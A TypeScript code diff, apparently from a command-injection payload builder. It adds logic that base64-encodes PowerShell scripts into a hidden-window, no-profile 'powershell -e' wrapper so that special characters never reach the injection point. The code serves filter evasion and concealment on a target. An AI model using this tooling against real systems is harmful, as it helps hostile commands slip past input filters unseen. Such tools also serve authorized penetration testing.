@@ -29,6 +29,13 @@ const utf8Base64 = (s: string) => {
 
 const B64_AVOIDS = "No quotes, ;, &, > or the payload's own / reach the injection point (base64 itself only uses letters, digits, +, / and =).";
 
+/**
+ * `powershell <flags> -c "<script>"` (the script holding no "): encoding the whole line would let the outer PowerShell
+ * expand the script's $variables to nothing inside the double quotes, so only <script> is encoded.
+ */
+const PS_C = /^powershell(?:\s+-(?!c\b|command\b)[A-Za-z]+(?:\s+[^\s"-]\S*)?)*\s+-c(?:ommand)?\s+"([^"]*)"$/i;
+const psScriptOf = (raw: string) => PS_C.exec(raw.trim())?.[1] ?? raw;
+
 /** Wraps the filled raw payload so the injection point never sees its special characters. */
 export function applyFilter(raw: string, f: Exclude<FilterId, "off">): { text: string; parts: PayloadPart[]; note: string } {
   switch (f) {
@@ -70,7 +77,7 @@ export function applyFilter(raw: string, f: Exclude<FilterId, "off">): { text: s
     }
     case "ps-b64":
       return {
-        text: `powershell -nop -w hidden -e ${utf16leBase64(raw)}`,
+        text: `powershell -nop -w hidden -e ${utf16leBase64(psScriptOf(raw))}`,
         parts: [
           { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
           { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
